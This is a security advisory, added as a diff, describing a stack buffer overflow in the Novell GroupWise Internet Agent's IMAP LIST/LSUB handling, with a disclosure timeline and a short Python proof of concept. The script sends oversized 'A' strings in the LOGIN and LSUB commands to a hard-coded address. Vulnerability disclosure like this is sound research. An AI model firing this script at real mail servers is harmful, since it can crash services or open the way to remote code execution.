@@ -1,0 +1,99 @@
+#####################################################################################
+
+Application:   Novell Groupwise Internet Agent IMAP LIST LSUB Command Remote Code Execution Vulnerability
+
+Platforms:   SLES 10 SP3 (GroupWise 8.0.2)
+
+Exploitation:   Remote code execution
+
+CVE Number:  
+
+Novell TID: 7007157
+
+Author:   Francis Provencher (Protek Research Lab's)
+
+WebSite:   http://www.protekresearchlab.com/
+
+
+#####################################################################################
+
+1) Introduction
+2) Report Timeline
+3) Technical details
+4) The Code
+
+
+#####################################################################################
+
+===============
+1) Introduction
+===============
+
+Novell, Inc. is a global software and services company based in Waltham, Massachusetts. The company specializes in
+
+enterprise operating systems, such as SUSE Linux Enterprise and Novell NetWare; identity, security, and systems
+management solutions; and collaboration solutions, such as Novell Groupwise and Novell Pulse. Novell was instrumental
+in making the Utah Valley a focus for technology and software development. Novell technology contributed to the
+emergence of local area networks, which displaced the dominant mainframe computing model and changed computing
+worldwide. Today, a primary focus of the company is on developing open source software for enterprise clients.
+
+(http://en.wikipedia.org/wiki/Novell)
+
+#####################################################################################
+
+============================
+2) Report Timeline
+============================
+
+2010-08-27  Vulnerability reported to vendor
+2010-11-08  Vendor disclose patch
+
+
+#####################################################################################
+
+============================
+3) Technical details
+============================
+
+This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Novell Groupwise
+
+Internet Agent where IMAP services run. Authentication is required to exploit this vulnerability.
+
+The flaw exists within the IMAP functionality included with GWIA. When provided with an overly long LIST or LSUB request
+to the CREATE verb, the IMAP server can be forced to overflow a buffer on the stack. Successful exploitation leads to
+
+remote code execution under the context of the server.
+
+
+#####################################################################################
+
+===========
+4) The Code
+===========
+
+#!/usr/bin/python
+#
+# Francis Provencher for Protek Research Lab's.
+#
+#
+
+
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+buffer = '\x41' * 1368
+
+s.connect(('192.168.100.178',143))
+s.recv(1024)
+s.send('A001 LOGIN test  test ' + buffer + '\r\n')
+s.recv(1024)
+s.send('A001 LSUB aa ' + buffer + '\r\n')
+s.recv(1024)
+s.close()
+
+
+
+#####################################################################################
+
+(PRL-2010-08)
